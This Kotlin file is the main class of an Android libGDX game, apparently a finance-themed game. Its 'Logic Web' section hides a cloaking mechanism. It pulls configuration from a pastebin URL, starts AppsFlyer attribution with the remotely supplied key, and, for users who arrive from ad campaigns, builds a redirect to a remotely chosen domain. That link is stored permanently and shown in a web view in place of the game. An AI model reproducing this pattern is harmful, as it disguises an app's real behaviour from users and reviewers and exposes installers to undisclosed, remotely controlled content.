package com.sukapital.saepital.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.sukapital.saepital.GameActivity
import com.sukapital.saepital.appContext
import com.sukapital.saepital.game.dataStore.DesireUtil
import com.sukapital.saepital.game.dataStore.ExpenseUtil
import com.sukapital.saepital.game.dataStore.IncomeUtil
import com.sukapital.saepital.game.manager.*
import com.sukapital.saepital.game.manager.util.MusicUtil
import com.sukapital.saepital.game.manager.util.SoundUtil
import com.sukapital.saepital.game.manager.util.SpriteUtil
import com.sukapital.saepital.game.screens.LoaderScreen
import com.sukapital.saepital.game.utils.GColor
import com.sukapital.saepital.game.utils.advanced.AdvancedGame
import com.sukapital.saepital.game.utils.disposeAll
import com.sukapital.saepital.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var G_isGame = false
    private set

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Splash() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.green
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val desireUtil  = DesireUtil(coroutine)
    val incomeUtil  = IncomeUtil(coroutine)
    val expenseUtil = ExpenseUtil(coroutine)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)
        goPlan()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("GAME_DATA", MODE_PRIVATE)

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun goPlan() {
        log("goPlan")
        activity.blockRedirect = { G_isGame = true }
        activity.initWeb()

        val plan = sharedPreferences.getString("PLAN", "nema") ?: "nema"

        try {
            if (plan == "nema") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (getJSON != null) {
                        AppsFlyerLib.getInstance().init(getJSON.b2, getAppsFlyerConversionListener(getJSON.a1), appContext)
                        AppsFlyerLib.getInstance().start(activity, getJSON.b2, getAppsFlyerRequestListener())
                    } else {
                        G_isGame = true
                    }
                }
            } else {
                activity.showUrl(plan)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            G_isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<GetJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/6zyxXa0r"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = GetJSON(
                    a1 = jsonResponse.getString("a1") ?: "",
                    b2 = jsonResponse.getString("b2") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class GetJSON(val a1: String, val b2: String)

    private fun getAppsFlyerConversionListener(domino: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"] as? String
                val afAd     = appfMap["af_ad"]    as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | appfMap = $appfMap")

                val link = "$domino?frosca=$campaign&viaf=$afAd&ediskas=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("PLAN", link).apply() }
                activity.showUrl(link)

            } else G_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            G_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}